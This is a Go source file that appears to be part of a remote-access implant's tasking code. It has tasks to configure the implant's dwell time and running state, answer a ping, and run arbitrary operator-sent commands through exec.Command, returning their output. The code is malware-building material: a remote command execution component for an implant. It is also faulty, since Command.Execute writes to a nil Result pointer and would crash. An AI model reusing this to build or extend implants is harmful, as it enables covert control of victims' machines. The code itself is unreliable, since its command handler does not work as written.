package main

import (
	"log"
	"os/exec"
)

type Tasker interface {
	// TODO: idk why I need this
	SetStatus(completed bool) // TODO: is idiomatic? rename?
	Execute() (*Result, error)
}

type Configure struct {
	Dwell     int
	Running   bool
	completed bool
	Implant   *Implant
}

func NewConfigureTask(dwell int, running bool, implant *Implant) *Configure {
	return &Configure{
		Dwell:   dwell,
		Running: running,
		Implant: implant,
	}
}

func (c *Configure) SetStatus(completed bool) {}
func (c *Configure) Execute() (*Result, error) {

	// TODO: essential these implant is pointer, test
	c.Implant.dwellTime = c.Dwell
	c.Implant.running = c.Running
	// set kill switch here too ?

	return &Result{
		Content: "Successfully Set",
		Success: true,
	}, nil
}

type Ping struct {
	completed bool
	result    string
}

func NewPingTask() *Ping {
	return &Ping{}
}

func (p *Ping) SetStatus(completed bool) {}
func (p *Ping) Execute() (*Result, error) {
	return &Result{
		Content: "PONG",
		Success: true,
	}, nil
}

// TODO: find better name ?
type Command struct {
	commandWithArgs []string
}

func NewCommandTask(commandWithArgs []string) *Command {
	return &Command{
		commandWithArgs: commandWithArgs,
	}
}

func (c *Command) SetStatus(completed bool) {
}

func (c *Command) Execute() (*Result, error) {

	// TODO: fix this logic, have it send cmd + args separately
	cmd := exec.Command(c.commandWithArgs[0], c.commandWithArgs[1:]...)

	output, err := cmd.CombinedOutput() //  CombinedOutput runs the command and returns its combined standard output and standard error.

	var result *Result

	// better way to do this?
	if err != nil {
		log.Println("Error executing command:", err)
		result.Success = false
		result.Content = err.Error()
	} else {
		result.Success = true
		result.Content = string(output)
	}

	return result, nil
}

// TODO: implement?
type ListThreads struct{}
